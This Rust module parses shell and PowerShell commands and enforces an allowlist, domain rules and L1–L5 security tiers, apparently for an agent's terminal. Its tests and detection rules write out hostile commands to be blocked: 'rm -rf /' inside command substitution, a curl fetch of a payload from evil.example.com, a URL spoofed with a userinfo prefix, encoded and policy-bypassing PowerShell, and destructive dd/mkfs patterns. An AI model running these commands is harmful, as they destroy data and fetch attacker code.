//! Pure-Rust POSIX + PowerShell quote-aware lexical/pipeline command analyzer,
//! `ExecPolicyV1` contract evaluator, and `SecurityTier` (`L1–L5`) gate.
#![allow(
    clippy::let_unit_value,
    clippy::obfuscated_if_else,
    clippy::unnecessary_operation
)]

use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

/// Embedded `contracts/terminal/exec-policy.v1.yaml` SSOT.
pub const EMBEDDED_EXEC_POLICY_V1_YAML: &str =
    include_str!("../../../../contracts/terminal/exec-policy.v1.yaml");

const MAX_DEPTH: usize = 6;
const L4_W: &str = "sudo su doas runas systemctl launchctl service apt apt-get yum dnf pacman apk zypper brew winget choco scoop chown chgrp mount umount shutdown reboot halt poweroff";
const L1_W: &str = "pwd ls cat head tail rg grep egrep fgrep wc which whoami uname date true false echo printf stat file basename dirname realpath sort uniq cut tr diff get-location get-childitem get-content get-item select-object where-object measure-object format-table format-list out-string convertto-json convertfrom-json test-path join-path split-path resolve-path write-output write-host";
const L2_W: &str = "rustc rustfmt vox pnpm npm npx yarn bun tsc vitest playwright pytest";
const WRAP_W: &str = "env command builtin exec nohup time nice timeout sudo doas xargs";
const PS_PAIR_W: &str = "-executionpolicy -ep -ex -windowstyle -w -outputformat -inputformat -configurationname -config";
const PAIR_W: &str = "env:-u env:--unset env:-C env:--chdir nice:-n timeout:-k timeout:-s sudo:-u sudo:-g sudo:-C sudo:-D doas:-u xargs:-I xargs:-L xargs:-n xargs:-P xargs:-d xargs:-a xargs:-E";
const FIND_MUT_W: &str = "-exec -execdir -ok -okdir -delete -fprint -fprintf -fls";
const GIT_RO_W: &str = "status diff log show rev-parse ls-files describe";
const GIT_BR_W: &str = "-d -D -m -M -c -C --delete --move --copy";
const REDIR_OPS: [&str; 9] = ["&>>", "<<<", "<<-", "&>", ">>", ">|", "<<", ">&", "<&"];
const EXT_SFX: [&str; 4] = [".exe", ".cmd", ".bat", ".ps1"];

const PF: [&str; 4] = ["!nu ", "/sh ", "/nu ", "!"];
type Step = (Vec<String>, bool, bool, bool);
type Ctx = (Vec<Step>, Vec<ExecCheckViolation>, bool);
type LexItem = (CommandSegment, Vec<String>);

macro_rules! in_w {
    ($n:expr, $w:expr) => {
        ($w).split_ascii_whitespace()
            .any(|x| x == AsRef::<str>::as_ref(&($n)))
    };
}

/// Terminal execution policy (`contracts/terminal/exec-policy.v1.yaml`).
#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(default)]
pub struct ExecPolicyV1 {
    pub version: u32,
    pub allowed_cmdlets: Vec<String>,
    pub allowed_binaries: Vec<String>,
    pub blocked_parameters: HashMap<String, Vec<String>>,
    pub network_fetch_commands: Vec<String>,
    pub network_fetch_domains: Vec<String>,
}

/// Violation emitted by [`evaluate_command_ast`] or [`evaluate_security_tier`].
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecCheckViolation {
    pub rule: String,
    pub message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub token: Option<String>,
}

/// Session command security tiers (`L1` read-only through `L5` autopilot floor).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SecurityTier {
    L1ReadOnly = 1,
    L2WorkspaceBuild = 2,
    L3StructuredDefault = 3,
    L4HostGated = 4,
    L5AutopilotFloor = 5,
}

/// Lexed command segment from a pipeline or compound shell chain.
#[derive(Debug, Default, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CommandSegment {
    pub argv: Vec<String>,
    pub has_output_redirect: bool,
    pub has_input_redirect: bool,
    pub has_command_subst: bool,
    pub has_process_subst: bool,
    pub raw: String,
}

fn vt(r: &str, t: Option<&str>) -> ExecCheckViolation {
    let message = t.map_or_else(|| r.into(), |x| format!("{r}: {x}"));
    ExecCheckViolation {
        rule: r.into(),
        message,
        token: t.map(Into::into),
    }
}

/// Parse the embedded `contracts/terminal/exec-policy.v1.yaml` contract.
#[must_use]
pub fn default_exec_policy_v1() -> ExecPolicyV1 {
    serde_yaml::from_str(EMBEDDED_EXEC_POLICY_V1_YAML).expect("valid exec-policy.v1.yaml")
}

/// Normalize an executable/cmdlet token to its lowercase basename.
#[must_use]
pub fn normalize_exec_name(tok: &str) -> String {
    let base = tok.trim().rsplit(['/', '\\']).next().unwrap_or(tok);
    let lo = base.to_ascii_lowercase();
    let st = EXT_SFX.iter().find_map(|x| lo.strip_suffix(x));
    st.unwrap_or(&lo).into()
}

fn scan_bal(s: &str, mut i: usize, op: u8, cl: u8) -> Result<usize, ExecCheckViolation> {
    let b = s.as_bytes();
    let (mut d, mut q) = (0usize, 0u8);
    while i < b.len() {
        match (q, b[i]) {
            (0 | b'"', b'\\') => {
                let Some(nx) = s.get(i + 1..).and_then(|r| r.chars().next()) else {
                    return Err(vt("trailing-backslash-escape", None));
                };
                i += 1 + nx.len_utf8();
            }
            (0, c @ (b'\'' | b'"')) => (q, i) = (c, i + 1),
            (b'\'', b'\'') if b.get(i + 1) == Some(&b'\'') => i += 2,
            (c, x) if c != 0 && c == x => (q, i) = (0, i + 1),
            (0, c) if c == op => (d, i) = (d + 1, i + 1),
            (0, c) if c == cl && d <= 1 => return Ok(i + 1),
            (0, c) if c == cl => (d, i) = (d - 1, i + 1),
            _ => i += s[i..].chars().next().map_or(1, char::len_utf8),
        }
    }
    Err(vt("parse-error", None))
}

fn lex_all(command: &str) -> Result<(Vec<LexItem>, bool), ExecCheckViolation> {
    let raw = command.trim();
    let s = PF
        .iter()
        .find_map(|p| raw.strip_prefix(p))
        .unwrap_or(raw)
        .trim();
    let b = (!s.is_empty())
        .then_some(s.as_bytes())
        .ok_or_else(|| vt("empty-command", None))?;
    let (mut out, mut subs, mut seg) = (Vec::new(), Vec::new(), CommandSegment::default());
    let (mut cur, mut q, mut iw, mut hq, mut sr) = (String::new(), 0u8, false, false, false);
    let (mut st, mut i, mut trailing_esc) = (0usize, 0usize, false);
    while i <= b.len() {
        let pe = || vt("parse-error", None);
        let _ = (!(i == b.len() && q != 0)).then_some(()).ok_or_else(pe)?;
        let (ch, r) = b.get(i).map_or((b'\n', ""), |&c| (c, &s[i..]));
        let two = r.starts_with("&&") || r.starts_with("||");
        let pipe = ch == b'|' && !(i > 0 && b[i - 1] == b'>');
        let amp = ch == b'&' && !r.starts_with("&>") && (!seg.argv.is_empty() || iw);
        let nl = matches!(ch, b'\n' | b'\r' | b';');
        let sep = q == 0 && (i == b.len() || nl || two || pipe || amp);
        let ws = q == 0 && ch.is_ascii_whitespace() && !matches!(ch, b'\n' | b'\r');
        let ps = q == 0 && (r.starts_with("<(") || r.starts_with(">("));
        let redir = q == 0 && !ps && (matches!(ch, b'<' | b'>') || r.starts_with("&>"));
        if (sep || ws || redir) && std::mem::replace(&mut iw, false) {
            let is_fd = redir && !hq && !cur.is_empty() && cur.bytes().all(|c| c.is_ascii_digit());
            let w = std::mem::take(&mut cur);
            (!is_fd && !std::mem::replace(&mut sr, false)).then(|| seg.argv.push(w));
            hq = false;
        }
        let sub_g =
            r.starts_with("$(") || ps || (q == 0 && (r.starts_with("@(") || (ch == b'(' && !iw)));
        match (q, ch) {
            (0, _) if sep && sr => return Err(pe()),
            (0, _) if sep || ws => {
                (sep && seg != CommandSegment::default()).then(|| {
                    seg.raw = s.get(st..i).unwrap_or("").trim().into();
                    out.push((std::mem::take(&mut seg), std::mem::take(&mut subs)));
                });
                i += 1 + usize::from(two || r.starts_with("|&"));
                st = sep.then_some(i).unwrap_or(st);
            }
            (0, _) if redir => {
                let out_r = ch == b'>' || r.starts_with("&>");
                (
                    seg.has_output_redirect |= out_r,
                    seg.has_input_redirect |= !out_r,
                );
                let n = REDIR_OPS
                    .iter()
                    .find(|o| r.starts_with(*o))
                    .map_or(1, |o| o.len());
                let dup = r.starts_with(">&") || r.starts_with("<&");
                let fd = b.get(i + 2..).map_or(0, |x| {
                    x.iter()
                        .take_while(|c| dup && (c.is_ascii_digit() || **c == b'-'))
                        .count()
                });
                (i, sr) = (i + n + fd, fd == 0);
            }
            (b'\'', b'\'') if b.get(i + 1) == Some(&b'\'') => (cur.push('\''), i += 2).1,
            (b'\'', b'\'') | (b'"', b'"') => (q, i) = (0, i + 1),
            (0 | b'"', b'\\') => match s.get(i + 1..).and_then(|x| x.chars().next()) {
                Some(nx) => (iw = true, cur.push(nx), i += 1 + nx.len_utf8()).2,
                None => (trailing_esc = true, i = b.len()).1,
            },
            (0, c @ (b'\'' | b'"')) => (iw, hq, q, i) = (true, true, c, i + 1),
            (0 | b'"', b'`') => {
                let rel = s[i + 1..]
                    .find('`')
                    .ok_or_else(|| vt("parse-error", Some("`")))?;
                (seg.has_command_subst, iw) = (true, true);
                (
                    subs.push(s[i + 1..i + 1 + rel].into()),
                    cur.push_str(&s[i..=i + 1 + rel]),
                );
                i += rel + 2;
            }
            (0 | b'"', _) if sub_g => {
                let p = i + usize::from(ch != b'(');
                let end = scan_bal(s, p, b'(', b')')?;
                (seg.has_process_subst |= ps, seg.has_command_subst |= !ps);
                (
                    subs.push(s[p + 1..end - 1].into()),
                    cur.push_str(&s[i..end]),
                );
                (iw, i) = (true, end);
            }
            (b'\'' | b'"', _) => {
                let ch_u = r.chars().next().unwrap();
                (cur.push(ch_u), i += ch_u.len_utf8());
            }
            (0, b'#') if !iw => i += r.find(['\n', '\r']).unwrap_or(r.len()),
            (0, b'{') if !iw => {
                let end = scan_bal(s, i, b'{', b'}')?;
                (cur.push_str(&s[i..end]), iw = true, i = end);
            }
            _ => {
                let ch_u = r.chars().next().unwrap();
                (iw = true, cur.push(ch_u), i += ch_u.len_utf8());
            }
        }
    }
    if iw {
        seg.argv.push(std::mem::take(&mut cur));
    }
    if seg != CommandSegment::default() {
        seg.raw = s.get(st..).unwrap_or("").trim().into();
        out.push((seg, subs));
    }
    let rule = if trailing_esc {
        "trailing-backslash-escape"
    } else {
        "empty-command"
    };
    (!out.is_empty())
        .then_some((out, trailing_esc))
        .ok_or_else(|| vt(rule, None))
}

/// Tokenize a POSIX or PowerShell command line into deterministic left-to-right segments.
pub fn tokenize_and_split_segments(
    command: &str,
) -> Result<Vec<CommandSegment>, ExecCheckViolation> {
    let (segs, trailing_esc) = lex_all(command)?;
    (!trailing_esc)
        .then(|| segs.into_iter().map(|(g, _)| g).collect())
        .ok_or_else(|| vt("trailing-backslash-escape", None))
}

fn unwrap_argv(argv: &[String], d: usize, cx: &mut Ctx) {
    if d > MAX_DEPTH {
        return cx.1.push(vt("max-wrapper-depth-exceeded", None));
    }
    let is_kv = |t: &str| {
        let k = t.split_once('=').map_or("", |(k, _)| k);
        let ok = k.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_');
        !k.is_empty() && !k.as_bytes()[0].is_ascii_digit() && ok
    };
    let ek = argv.iter().take_while(|t| is_kv(t)).count();
    let rem = argv.get(ek..).filter(|s| !s.is_empty()).unwrap_or(argv);
    let Some(f0) = rem.first() else { return };
    if f0.starts_with('{') && f0.ends_with('}') && f0.len() > 2 {
        return unwrap_str(&f0[1..f0.len() - 1], d + 1, cx);
    }
    let name = normalize_exec_name(f0);
    let mut cat = name == "mkfs" || name.starts_with("mkfs.");
    for a in &rem[1..] {
        let l = a.to_ascii_lowercase();
        let sl = a.starts_with('/') && a.trim_matches('/').is_empty();
        let rm_r = a == "--no-preserve-root" || a == "/*" || sl;
        let dd_r = l.starts_with("if=") || l.starts_with("of=/dev/");
        cat |= (name == "dd" && dd_r) || (name == "rm" && rm_r);
        let dyn_k = l.contains("invoke-expression") || l.contains("iex ") || l.contains("$(");
        let dsb = a.starts_with('{') && a.ends_with('}') && dyn_k;
        dsb.then(|| cx.1.push(vt("dynamic-eval-forbidden", Some(a))));
    }
    cat.then(|| cx.1.push(vt("catastrophic-command-forbidden", Some(f0))));
    let is_ev = in_w!(&name, "eval invoke-expression iex");
    is_ev.then(|| cx.1.push(vt("dynamic-eval-forbidden", Some(f0))));
    if matches!(f0.as_str(), "&" | ".") {
        return match rem.get(1).map(String::as_str) {
            None => cx.1.push(vt("dynamic-eval-forbidden", Some(f0))),
            Some(n) if n.starts_with('$') => cx.1.push(vt("dynamic-eval-forbidden", Some(n))),
            Some(n) if n.starts_with('{') && n.ends_with('}') && n.len() >= 2 => {
                unwrap_str(&n[1..n.len() - 1], d + 1, cx)
            }
            Some(_) => unwrap_argv(&rem[1..], d + 1, cx),
        };
    }
    let (ps, wr) = (in_w!(&name, "pwsh powershell"), in_w!(&name, WRAP_W));
    let sh = in_w!(&name, "sh bash zsh fish dash ksh nu");
    fn ps_f(lo: &str) -> Option<&str> {
        lo.strip_prefix("--")
            .or_else(|| lo.strip_prefix('-'))
            .or_else(|| lo.strip_prefix('/').filter(|x| !x.contains('/')))
    }
    let mut wi = usize::from(ps || sh || wr);
    while wi > 0 && wi < rem.len() {
        let (t, lo) = (rem[wi].as_str(), rem[wi].to_ascii_lowercase());
        let ps_enc = ps
            && ps_f(&lo).is_some_and(|s| {
                !s.is_empty()
                    && (s == "ec"
                        || s == "ea"
                        || "encodedcommand".starts_with(s)
                        || "encodedarguments".starts_with(s))
            });
        if ps_enc {
            cx.1.push(vt("encoded-command-forbidden", Some(t)));
            return cx.0.push((rem.to_vec(), false, true, ek > 0));
        }
        let sc = t.starts_with('-') && !t.starts_with("--") && t.ends_with('c');
        let sh_c = sh && (t == "-c" || t == "--command" || sc);
        let ps_c = ps && ps_f(&lo).is_some_and(|s| !s.is_empty() && "command".starts_with(s));
        let env_s = name == "env" && matches!(t, "-S" | "--split-string");
        if ps_c || sh_c || env_s {
            cx.0.push((rem.to_vec(), true, ps || sh, ek > 0 || name == "env"));
            let a1 = rem.get(wi + 1).cloned().unwrap_or_default();
            return unwrap_str(&if ps { rem[wi + 1..].join(" ") } else { a1 }, d + 1, cx);
        }
        let pair = (ps && in_w!(&lo, PS_PAIR_W)) || in_w!(&format!("{name}:{t}"), PAIR_W);
        let opt = (name == "env" && is_kv(t))
            || ((t.starts_with('-') || (ps && ps_f(&lo).is_some())) && !(wr && t == "--"));
        match (pair, opt) {
            (true, _) => wi += 2,
            (_, true) => wi += 1,
            _ => break,
        }
    }
    wi += usize::from(wr && wi > 0 && rem.get(wi).is_some_and(|x| x == "--"));
    wi += usize::from(wr && wi > 0 && name == "timeout" && wi < rem.len());
    if wr && wi > 0 && wi < rem.len() {
        cx.0.push((rem.to_vec(), true, false, ek > 0 || name == "env"));
        return unwrap_argv(&rem[wi..], d + 1, cx);
    }
    cx.0.push((rem.to_vec(), false, false, ek > 0));
    let mut i = if name == "find" { 1 } else { rem.len() };
    while i < rem.len() {
        let ex = in_w!(&rem[i], "-exec -execdir -ok -okdir");
        let pos = rem[i + 1..].iter().position(|t| t == ";" || t == "+");
        let end = ex
            .then(|| pos.map_or(rem.len(), |p| i + 1 + p))
            .unwrap_or(i);
        (ex && i + 1 < end).then(|| unwrap_argv(&rem[i + 1..end], d + 1, cx));
        i = end + 1;
    }
}

fn unwrap_str(cmd: &str, d: usize, cx: &mut Ctx) {
    if d > MAX_DEPTH {
        return cx.1.push(vt("max-wrapper-depth-exceeded", None));
    }
    let Ok((segs, trailing_esc)) = lex_all(cmd).map_err(|v| cx.1.push(v)) else {
        return;
    };
    trailing_esc.then(|| cx.1.push(vt("trailing-backslash-escape", None)));
    for (seg, subs) in segs {
        cx.2 |= seg.has_output_redirect || seg.has_input_redirect;
        let r = Some(seg.raw.as_str());
        seg.has_command_subst
            .then(|| cx.1.push(vt("command-substitution-forbidden", r)));
        seg.has_process_subst
            .then(|| cx.1.push(vt("process-substitution-forbidden", r)));
        unwrap_argv(&seg.argv, d, cx);
        for sub in &subs {
            let mut sc = Ctx::default();
            unwrap_str(sub, d + 1, &mut sc);
            (cx.2 |= sc.2, cx.0.extend(sc.0));
            cx.1.extend(sc.1.into_iter().filter(|v| v.rule != "empty-command"));
        }
    }
}

/// Extract all unwrapped leaf `argv` vectors in deterministic left-to-right lexical order.
#[must_use]
pub fn extract_effective_commands(command: &str) -> Vec<Vec<String>> {
    let mut cx = Ctx::default();
    unwrap_str(command, 0, &mut cx);
    let it = cx.0.into_iter().filter(|s| !s.1 && !s.0.is_empty());
    it.map(|s| s.0).collect()
}

/// Evaluate `command` against [`ExecPolicyV1`] allowlists, blocked parameters, and URL domains.
#[must_use]
pub fn evaluate_command_ast(command: &str, policy: &ExecPolicyV1) -> Vec<ExecCheckViolation> {
    let mut cx = Ctx::default();
    unwrap_str(command, 0, &mut cx);
    if cx.0.is_empty() && cx.1.is_empty() {
        return vec![vt("empty-command", None)];
    }
    let ns = |xs: &[String]| -> HashSet<String> {
        xs.iter()
            .map(|s| normalize_exec_name(s.trim_end_matches('.')))
            .collect()
    };
    let (cm, bn) = (ns(&policy.allowed_cmdlets), ns(&policy.allowed_binaries));
    let (nc, nd) = (
        ns(&policy.network_fetch_commands),
        ns(&policy.network_fetch_domains),
    );
    let uh = |tok: &str| -> Option<Result<String, ()>> {
        let (sch, af) = tok.split_once("://")?;
        let cut = af.find(['/', '?', '#', '\'', '"']).unwrap_or(af.len());
        let h = af[..cut]
            .rsplit('@')
            .next()
            .unwrap_or("")
            .split(':')
            .next()
            .unwrap_or("")
            .trim_end_matches('.');
        let ok = in_w!(&sch.to_ascii_lowercase(), "http https") && !h.is_empty();
        ok.then(|| Ok(h.to_ascii_lowercase())).or(Some(Err(())))
    };
    for (argv, _, _, _) in &cx.0 {
        let Some(raw) = argv.first() else { continue };
        let norm = normalize_exec_name(raw);
        let net = nc.contains(&norm);
        let http = argv[1..].iter().any(|a| matches!(uh(a), Some(Ok(_))));
        let ok = (cm.is_empty() && bn.is_empty()) || cm.contains(&norm) || bn.contains(&norm);
        (!(ok || (net && !nd.is_empty() && http)))
            .then(|| cx.1.push(vt("command-not-allowed", Some(raw))));
        for (sc, blk) in &policy.blocked_parameters {
            let m = sc.trim() == "*"
                || sc.trim().eq_ignore_ascii_case(raw.trim())
                || normalize_exec_name(sc) == norm;
            for a in argv[1..].iter().filter(|_| m) {
                let s1 = a.strip_prefix('-').unwrap_or("").trim_start_matches('-');
                let p = s1.split([':', '=']).next().unwrap_or("");
                let hit = !p.is_empty() && blk.iter().any(|b| b.trim().eq_ignore_ascii_case(p));
                hit.then(|| cx.1.push(vt("blocked-parameter", Some(a))));
            }
        }
        for a in argv[1..].iter().filter(|_| net) {
            match uh(a) {
                Some(Err(())) => cx.1.push(vt("network-domain-denied", Some(a))),
                Some(Ok(h)) => (nd.is_empty() || !nd.contains(&h))
                    .then(|| cx.1.push(vt("network-domain-denied", Some(&h))))
                    .unwrap_or(()),
                None => {}
            }
        }
    }
    cx.1
}

/// Evaluate the minimum [`SecurityTier`] required by `command` and enforce `required <= active_tier`.
pub fn evaluate_security_tier(
    command: &str,
    active_tier: SecurityTier,
) -> Result<SecurityTier, ExecCheckViolation> {
    use SecurityTier::{
        L1ReadOnly as T1, L2WorkspaceBuild as T2, L3StructuredDefault as T3, L4HostGated as T4,
        L5AutopilotFloor as T5,
    };
    let mut cx = Ctx::default();
    unwrap_str(command, 0, &mut cx);
    if let Some(v) = cx.1.into_iter().next() {
        return Err(v);
    }
    let init = (!cx.0.is_empty()).then_some([T1, T3][usize::from(cx.2)]);
    let mut req = init.ok_or_else(|| vt("empty-command", None))?;
    for (argv, wrap, sh_c, env_p) in &cx.0 {
        let refs: Vec<&str> = argv.iter().map(String::as_str).collect();
        let raw = argv.first().map_or("", String::as_str);
        let name = normalize_exec_name(raw);
        let fl = [T1, T2][usize::from(*env_p || raw.contains(['/', '\\']))];
        let csub = refs[1..]
            .iter()
            .find(|a| !a.starts_with('-'))
            .copied()
            .unwrap_or("");
        let cv = refs[1..].iter().any(|a| matches!(*a, "--version" | "-V"));
        let cro = cv
            || in_w!(csub, "metadata check clippy tree version")
            || (csub == "test" && refs[1..].contains(&"--no-run"));
        let mut gr = &refs[1..];
        while name == "git"
            && gr
                .first()
                .is_some_and(|x| x.starts_with("-c") || x.starts_with("-C"))
        {
            gr = &gr[1 + usize::from(gr[0].len() == 2 && gr.len() > 1)..];
        }
        let gsub = gr.first().copied().unwrap_or("");
        let gro = in_w!(gsub, GIT_RO_W)
            || (gsub == "branch" && !gr[1..].iter().any(|&a| in_w!(a, GIT_BR_W)));
        let fmut = argv[1..]
            .iter()
            .any(|a| in_w!(&a.to_ascii_lowercase(), FIND_MUT_W));
        let st = match name.as_str() {
            _ if super::floor::command_argv_rewrites_history(&refs) => T5,
            "" => T3,
            n if in_w!(n, L4_W) => T4,
            n if *sh_c || in_w!(n, "xargs exec nohup") => T3,
            n if *wrap && in_w!(n, "env command builtin time nice timeout") => T2,
            "env" if argv.len() == 1 => fl,
            n if in_w!(n, L1_W) => fl,
            "find" if !fmut => fl,
            "git" if gro => fl,
            "cargo" if cro => fl,
            "cargo" if in_w!(csub, "test build run bench doc nextest") => T2,
            n if in_w!(n, L2_W) && !refs[1..].contains(&"publish") => T2,
            "node" if !refs[1..].iter().any(|&a| in_w!(a, "-e --eval -p --print")) => T2,
            _ => T3,
        };
        req = req.max(st);
    }
    let err = || vt("security-tier-exceeded", Some(&format!("{req:?}")));
    (req <= active_tier).then_some(req).ok_or_else(err)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_and_single_token_boundaries() {
        let policy = default_exec_policy_v1();
        let empty_v = evaluate_command_ast("", &policy);
        assert_eq!(empty_v.len(), 1);
        assert_eq!(empty_v[0].rule, "empty-command");

        let ws_err =
            evaluate_security_tier("   \t\n ", SecurityTier::L3StructuredDefault).unwrap_err();
        assert_eq!(ws_err.rule, "empty-command");

        assert!(evaluate_command_ast("Get-Location", &policy).is_empty());
        assert!(evaluate_command_ast("git status", &policy).is_empty());
        assert_eq!(
            evaluate_security_tier("Get-Location", SecurityTier::L1ReadOnly).unwrap(),
            SecurityTier::L1ReadOnly
        );
        assert_eq!(
            evaluate_security_tier("git status", SecurityTier::L1ReadOnly).unwrap(),
            SecurityTier::L1ReadOnly
        );
        assert_eq!(
            evaluate_security_tier("pwd", SecurityTier::L1ReadOnly).unwrap(),
            SecurityTier::L1ReadOnly
        );
    }

    #[test]
    fn subshell_backtick_process_subst_and_l1_redirects() {
        for bad in [
            "echo $(whoami)",
            "echo `id`",
            // vox-arch-check: allow abs-path
            "echo \"hello $(rm -rf /)\"",
            "diff <(ls) <(ls -a)",
            "cat Cargo.toml > out.txt",
            "ls | cat >> out.txt",
        ] {
            let res = evaluate_security_tier(bad, SecurityTier::L1ReadOnly);
            assert!(
                res.is_err(),
                "expected L1 rejection for `{bad}`, got {res:?}"
            );
        }

        let ok = evaluate_security_tier("echo 'literal $(whoami)'", SecurityTier::L1ReadOnly);
        assert_eq!(ok, Ok(SecurityTier::L1ReadOnly));

        assert_eq!(
            evaluate_security_tier(
                "cat Cargo.toml > out.txt",
                SecurityTier::L3StructuredDefault
            ),
            Ok(SecurityTier::L3StructuredDefault)
        );

        let segs = tokenize_and_split_segments("git st\"at\"'us'").unwrap();
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0].argv, vec!["git", "status"]);
    }

    #[test]
    fn wrapper_unwrapping_and_encoded_eval_rejection() {
        let policy = default_exec_policy_v1();
        for encoded in [
            "pwsh -EncodedCommand ZWNobyBoag==",
            "powershell -enc ZWNobyBoag==",
            "pwsh -ec ZWNobyBoag==",
            "pwsh -e ZWNobyBoag==",
        ] {
            let v = evaluate_command_ast(encoded, &policy);
            assert!(
                v.iter().any(|x| x.rule == "encoded-command-forbidden"),
                "got {v:?}"
            );
            let t = evaluate_security_tier(encoded, SecurityTier::L5AutopilotFloor).unwrap_err();
            assert_eq!(t.rule, "encoded-command-forbidden");
        }

        for dyn_eval in [
            "Invoke-Expression $x",
            "iex $x",
            "eval \"rm -rf target\"",
            "& $dynamicCmd",
        ] {
            let v = evaluate_command_ast(dyn_eval, &policy);
            assert!(
                v.iter().any(|x| x.rule == "dynamic-eval-forbidden"),
                "got {v:?}"
            );
            let t = evaluate_security_tier(dyn_eval, SecurityTier::L5AutopilotFloor).unwrap_err();
            assert_eq!(t.rule, "dynamic-eval-forbidden");
        }

        for wrapped in [
            "env FOO=1 command timeout 5s git reset --hard",
            "bash -c \"git push --force\"",
            "find . -exec rm {} +",
            "find . -delete",
            "xargs rm",
        ] {
            assert!(evaluate_security_tier(wrapped, SecurityTier::L1ReadOnly).is_err());
            assert!(evaluate_security_tier(wrapped, SecurityTier::L2WorkspaceBuild).is_err());
        }

        let mut nested = "ls".to_string();
        for _ in 0..8 {
            nested = format!("sh -c '{}'", nested.replace('\'', "'\\''"));
        }
        let depth_err = evaluate_security_tier(&nested, SecurityTier::L4HostGated).unwrap_err();
        assert_eq!(depth_err.rule, "max-wrapper-depth-exceeded");
    }

    #[test]
    fn exec_policy_v1_parameters_allowlist_and_domains() {
        let policy = default_exec_policy_v1();
        assert!(
            evaluate_command_ast("Get-ChildItem -Recurse", &policy)
                .iter()
                .any(|v| v.rule == "blocked-parameter")
        );
        assert!(
            evaluate_command_ast("Totally-Fake-Cmdlet", &policy)
                .iter()
                .any(|v| v.rule == "command-not-allowed")
        );
        assert!(
            evaluate_command_ast("curl https://api.github.com/repos/vox/vox", &policy).is_empty()
        );
        assert!(
            evaluate_command_ast("curl https://evil.example.com/payload.sh", &policy)
                .iter()
                .any(|v| v.rule == "network-domain-denied")
        );
        assert!(
            evaluate_command_ast(
                "curl https://api.github.com@evil.example.com/payload.sh",
                &policy
            )
            .iter()
            .any(|v| v.rule == "network-domain-denied")
        );
    }

    #[test]
    fn security_tier_ordering_and_pipeline_left_to_right() {
        assert_eq!(
            evaluate_security_tier(
                "cargo test -p vox-orchestrator",
                SecurityTier::L2WorkspaceBuild
            ),
            Ok(SecurityTier::L2WorkspaceBuild)
        );
        assert!(
            evaluate_security_tier("cargo test -p vox-orchestrator", SecurityTier::L1ReadOnly)
                .is_err()
        );
        assert_eq!(
            evaluate_security_tier("cargo test --no-run", SecurityTier::L1ReadOnly),
            Ok(SecurityTier::L1ReadOnly)
        );
        assert!(evaluate_security_tier("sudo id", SecurityTier::L3StructuredDefault).is_err());
        assert_eq!(
            evaluate_security_tier("sudo id", SecurityTier::L4HostGated),
            Ok(SecurityTier::L4HostGated)
        );

        let extracted =
            extract_effective_commands("git status && env A=1 cargo check | Select-Object Name");
        assert_eq!(
            extracted,
            vec![
                vec!["git", "status"],
                vec!["cargo", "check"],
                vec!["Select-Object", "Name"],
            ]
        );

        let policy = default_exec_policy_v1();
        let violations = evaluate_command_ast(
            "First-Bad-Cmd | Get-ChildItem -Recurse; Second-Bad-Cmd",
            &policy,
        );
        assert_eq!(violations.len(), 3);
        assert_eq!(violations[0].token.as_deref(), Some("First-Bad-Cmd"));
        assert_eq!(violations[1].rule, "blocked-parameter");
        assert_eq!(violations[2].token.as_deref(), Some("Second-Bad-Cmd"));
    }

    #[test]
    fn utf8_char_boundaries_trailing_backslash_and_pwsh_prefix_flags() {
        let policy = default_exec_policy_v1();
        for utf8_cmd in [
            "echo 'Salvē, Rōma — 🚀'",
            "echo \"Salvē, Rōma — 🚀\"",
            "echo Salvē_🚀 \\🚀",
            "rg '═' src/ && echo 🦀",
        ] {
            let segs = tokenize_and_split_segments(utf8_cmd).expect("utf8 lex");
            assert!(!segs.is_empty());
            assert_eq!(
                evaluate_security_tier(utf8_cmd, SecurityTier::L1ReadOnly),
                Ok(SecurityTier::L1ReadOnly)
            );
        }
        let segs = tokenize_and_split_segments("echo 'Salvē, Rōma — 🚀'").unwrap();
        assert_eq!(segs[0].argv, vec!["echo", "Salvē, Rōma — 🚀"]);

        let trail = "pwd && git push --force origin main \\";
        assert_eq!(
            tokenize_and_split_segments(trail).unwrap_err().rule,
            "trailing-backslash-escape"
        );
        assert_eq!(
            extract_effective_commands(trail),
            vec![
                vec!["pwd"],
                vec!["git", "push", "--force", "origin", "main"]
            ]
        );
        assert!(
            evaluate_command_ast(trail, &policy)
                .iter()
                .any(|v| v.rule == "trailing-backslash-escape")
        );
        assert_eq!(
            evaluate_security_tier(trail, SecurityTier::L5AutopilotFloor)
                .unwrap_err()
                .rule,
            "trailing-backslash-escape"
        );

        for pwsh_enc in [
            "pwsh -enco ZWNobyBoag==",
            "powershell -EnCoDeDcOmMaNd ZWNobyBoag==",
            "pwsh -encodedc ZWNobyBoag==",
            "powershell /enco ZWNobyBoag==",
            "pwsh -w Hidden -en ZWNobyBoag==",
        ] {
            assert!(
                evaluate_command_ast(pwsh_enc, &policy)
                    .iter()
                    .any(|v| v.rule == "encoded-command-forbidden"),
                "missed {pwsh_enc}"
            );
            assert_eq!(
                evaluate_security_tier(pwsh_enc, SecurityTier::L5AutopilotFloor)
                    .unwrap_err()
                    .rule,
                "encoded-command-forbidden"
            );
        }

        for pwsh_cmd in [
            "pwsh -com \"git push --force origin main\"",
            "powershell -CoMmAnD 'git push --force origin main'",
            "pwsh -ex Bypass -co \"git reset --hard\"",
        ] {
            assert!(evaluate_security_tier(pwsh_cmd, SecurityTier::L4HostGated).is_err());
            assert_eq!(
                evaluate_security_tier(pwsh_cmd, SecurityTier::L5AutopilotFloor),
                Ok(SecurityTier::L5AutopilotFloor)
            );
        }
    }
}
